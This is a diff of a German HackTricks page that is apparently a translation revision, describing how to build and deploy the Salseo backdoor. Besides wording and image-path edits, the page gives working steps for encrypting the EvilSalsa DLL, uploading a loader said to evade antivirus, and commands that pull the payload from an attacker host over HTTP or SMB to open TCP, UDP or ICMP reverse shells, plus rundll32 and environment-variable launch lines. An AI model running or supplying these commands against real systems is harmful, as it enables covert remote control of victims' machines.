@@ -6,11 +6,11 @@
 
 Andere Möglichkeiten, HackTricks zu unterstützen:
 
-* Wenn Sie Ihr **Unternehmen in HackTricks beworben sehen möchten** oder **HackTricks als PDF herunterladen möchten**, überprüfen Sie die [**ABONNEMENTPLÄNE**](https://github.com/sponsors/carlospolop)!
+* Wenn Sie Ihr **Unternehmen in HackTricks beworben sehen möchten** oder **HackTricks im PDF-Format herunterladen möchten**, überprüfen Sie die [**ABONNEMENTPLÄNE**](https://github.com/sponsors/carlospolop)!
 * Holen Sie sich das [**offizielle PEASS & HackTricks-Merchandise**](https://peass.creator-spring.com)
 * Entdecken Sie [**The PEASS Family**](https://opensea.io/collection/the-peass-family), unsere Sammlung exklusiver [**NFTs**](https://opensea.io/collection/the-peass-family)
 * **Treten Sie der** 💬 [**Discord-Gruppe**](https://discord.gg/hRep4RUj7f) oder der [**Telegram-Gruppe**](https://t.me/peass) bei oder **folgen** Sie uns auf **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
-* **Teilen Sie Ihre Hacking-Tricks, indem Sie PRs an die** [**HackTricks**](https://github.com/carlospolop/hacktricks) und [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) Github-Repositories senden.
+* **Teilen Sie Ihre Hacking-Tricks, indem Sie PRs an die** [**HackTricks**](https://github.com/carlospolop/hacktricks) und [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) GitHub-Repositories senden.
 
 </details>
 
@@ -24,13 +24,13 @@ Sie können die **Architektur auswählen** innerhalb von Visual Studio im **link
 
 (\*\*Wenn Sie diese Optionen nicht finden können, klicken Sie auf **"Project Tab"** und dann auf **"\<Project Name> Properties"**)
 
-![](<../.gitbook/assets/image (132).png>)
+![](<../.gitbook/assets/image (839).png>)
 
 Bauen Sie dann beide Projekte (Build -> Build Solution) (Im Log wird der Pfad der ausführbaren Datei angezeigt):
 
-![](<../.gitbook/assets/image (1) (2) (1) (1) (1).png>)
+![](<../.gitbook/assets/image (381).png>)
 
-## Vorbereiten des Backdoors
+## Bereiten Sie die Backdoor vor
 
 Zunächst müssen Sie die **EvilSalsa.dll** verschlüsseln. Dazu können Sie das Python-Skript **encrypterassembly.py** verwenden oder das Projekt **EncrypterAssembly** kompilieren:
 
@@ -40,29 +40,25 @@ python EncrypterAssembly/encrypterassembly.py <FILE> <PASSWORD> <OUTPUT_FILE>
 python EncrypterAssembly/encrypterassembly.py EvilSalsax.dll password evilsalsa.dll.txt
 ```
 ### Windows
-
-#### Salseo
-
-Salseo is a backdoor that allows an attacker to maintain access to a compromised system. It is a simple backdoor that listens on a specified port and executes commands sent by the attacker. The backdoor can be compiled using MinGW and works on Windows systems.
 ```
 EncrypterAssembly.exe <FILE> <PASSWORD> <OUTPUT_FILE>
 EncrypterAssembly.exe EvilSalsax.dll password evilsalsa.dll.txt
 ```
-Ok, jetzt hast du alles, was du brauchst, um das gesamte Salseo-Ding auszuführen: die **kodierte EvilDalsa.dll** und das **Binärfile des SalseoLoader.**
+Ok, jetzt hast du alles, was du brauchst, um das gesamte Salseo-Ding auszuführen: die **codierte EvilDalsa.dll** und das **Binärfile des SalseoLoader.**
 
 **Lade das SalseoLoader.exe-Binärfile auf die Maschine hoch. Es sollte von keinem AV erkannt werden...**
 
-## **Führe den Backdoor aus**
+## **Führe das Backdoor aus**
 
-### **Erhalte eine TCP-Reverse-Shell (Laden der codierten DLL über HTTP)**
+### **Erhalten einer TCP-Reverse-Shell (Herunterladen der codierten dll über HTTP)**
 
-Denke daran, einen nc als Reverse-Shell-Listener zu starten und einen HTTP-Server zu starten, um das kodierte EvilSalsa bereitzustellen.
+Denke daran, einen nc als Reverse-Shell-Listener zu starten und einen HTTP-Server zu starten, um das codierte evilsalsa bereitzustellen.
 ```
 SalseoLoader.exe password http://<Attacker-IP>/evilsalsa.dll.txt reversetcp <Attacker-IP> <Port>
 ```
-### **Erhalt eines UDP-Reverse-Shells (Herunterladen einer codierten DLL über SMB)**
+### **Erhalten einer UDP-Reverse-Shell (Herunterladen einer codierten DLL über SMB)**
 
-Denken Sie daran, einen nc als Reverse-Shell-Listener zu starten und einen SMB-Server bereitzustellen, um das codierte evilsalsa herunterzuladen (impacket-smbserver).
+Denken Sie daran, einen nc als Reverse-Shell-Listener zu starten und einen SMB-Server bereitzustellen, um das codierte evilsalsa zu bedienen (impacket-smbserver).
 ```
 SalseoLoader.exe password \\<Attacker-IP>/folder/evilsalsa.dll.txt reverseudp <Attacker-IP> <Port>
 ```
@@ -91,57 +87,57 @@ SalseoLoader.exe password C:/Path/to/evilsalsa.dll.txt reverseicmp <Attacker-IP>
 
 ### Fügen Sie vor der Hauptfunktion hinzu: \[DllExport]
 
-![](<../.gitbook/assets/image (2) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png>)
+![](<../.gitbook/assets/image (409).png>)
 
 ### Installieren Sie DllExport für dieses Projekt
 
 #### **Tools** --> **NuGet-Paket-Manager** --> **NuGet-Pakete für Lösung verwalten...**
 
-![](<../.gitbook/assets/image (3) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png>)
+![](<../.gitbook/assets/image (881).png>)
 
-#### **Suchen Sie nach dem DllExport-Paket (im Bereich Durchsuchen) und klicken Sie auf Installieren (und akzeptieren Sie das Popup)**
+#### **Suchen Sie nach dem DllExport-Paket (über die Registerkarte Durchsuchen) und klicken Sie auf Installieren (und akzeptieren Sie das Popup)**
 
-![](<../.gitbook/assets/image (4) (1) (1) (1) (1) (1) (1) (1) (1) (1).png>)
+![](<../.gitbook/assets/image (100).png>)
 
-Im Projektordner sind die Dateien **DllExport.bat** und **DllExport\_Configure.bat** erschienen
+In Ihrem Projektordner sind die Dateien **DllExport.bat** und **DllExport\_Configure.bat** erschienen
 
 ### **D**einstallieren Sie DllExport
 
 Klicken Sie auf **Deinstallieren** (ja, es ist seltsam, aber vertrauen Sie mir, es ist notwendig)
 
-![](<../.gitbook/assets/image (5) (1) (1) (2) (1).png>)
+![](<../.gitbook/assets/image (97).png>)
 
-### **Visual Studio beenden und DllExport\_configure ausführen**
+### **Visual Studio beenden und DllExport\_Configure ausführen**
 
 Einfach Visual Studio **beenden**
 
-Gehen Sie dann zu Ihrem **SalseoLoader-Ordner** und **führen Sie DllExport\_Configure.bat aus**
+Gehen Sie dann zu Ihrem **SalseoLoader-Ordner** und führen Sie **DllExport\_Configure.bat** aus
 
-Wählen Sie **x64** (wenn Sie es in einem x64-System verwenden möchten, das war mein Fall), wählen Sie **System.Runtime.InteropServices** (im **Namespace für DllExport**) und klicken Sie auf **Anwenden**
+Wählen Sie **x64** (wenn Sie es in einer x64-Box verwenden möchten, das war mein Fall), wählen Sie **System.Runtime.InteropServices** (innerhalb von **Namespace für DllExport**) und klicken Sie auf **Anwenden**
 
-![](<../.gitbook/assets/image (7) (1) (1) (1) (1).png>)
+![](<../.gitbook/assets/image (882).png>)
 
 ### **Öffnen Sie das Projekt erneut mit Visual Studio**
 
 **\[DllExport]** sollte nicht mehr als Fehler markiert sein
 
-![](<../.gitbook/assets/image (8) (1).png>)
+![](<../.gitbook/assets/image (670).png>)
 
 ### Lösung erstellen
 
 Wählen Sie **Ausgabetyp = Klassenbibliothek** (Projekt --> SalseoLoader-Eigenschaften --> Anwendung --> Ausgabetyp = Klassenbibliothek)
 
-![](<../.gitbook/assets/image (10) (1).png>)
+![](<../.gitbook/assets/image (847).png>)
 
 Wählen Sie die **x64-Plattform** (Projekt --> SalseoLoader-Eigenschaften --> Erstellen --> Zielplattform = x64)
 
-![](<../.gitbook/assets/image (9) (1) (1).png>)
+![](<../.gitbook/assets/image (285).png>)
 
 Um die Lösung zu **erstellen**: Build --> Lösung erstellen (Im Ausgabekonsole wird der Pfad der neuen DLL angezeigt)
 
-### Testen Sie die generierte DLL
+### Testen Sie die generierte Dll
 
-Kopieren Sie die DLL und fügen Sie sie ein, wo Sie sie testen möchten.
+Kopieren Sie die Dll und fügen Sie sie ein, wo Sie sie testen möchten.
 
 Ausführen:
 ```
@@ -162,9 +158,7 @@ $env:lport="1337"
 $env:shell="reversetcp"
 rundll32.exe SalseoLoader.dll,main
 ```
-### CMD
-
-CMD steht für Command Prompt, was die Befehlszeile in Windows-Betriebssystemen bezeichnet.
+### Befehlszeile
 ```
 set pass=password
 set payload=http://10.2.0.5/evilsalsax64.dll.txt
@@ -183,6 +177,6 @@ Andere Möglichkeiten, HackTricks zu unterstützen:
 * Holen Sie sich das [**offizielle PEASS & HackTricks-Merchandise**](https://peass.creator-spring.com)
 * Entdecken Sie [**The PEASS Family**](https://opensea.io/collection/the-peass-family), unsere Sammlung exklusiver [**NFTs**](https://opensea.io/collection/the-peass-family)
 * **Treten Sie der** 💬 [**Discord-Gruppe**](https://discord.gg/hRep4RUj7f) oder der [**Telegram-Gruppe**](https://t.me/peass) bei oder **folgen** Sie uns auf **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
-* **Teilen Sie Ihre Hacking-Tricks, indem Sie PRs an die** [**HackTricks**](https://github.com/carlospolop/hacktricks) und [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) Github-Repositories einreichen.
+* **Teilen Sie Ihre Hacking-Tricks, indem Sie PRs an die** [**HackTricks**](https://github.com/carlospolop/hacktricks) und [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) GitHub-Repositories einreichen.
 
 </details>
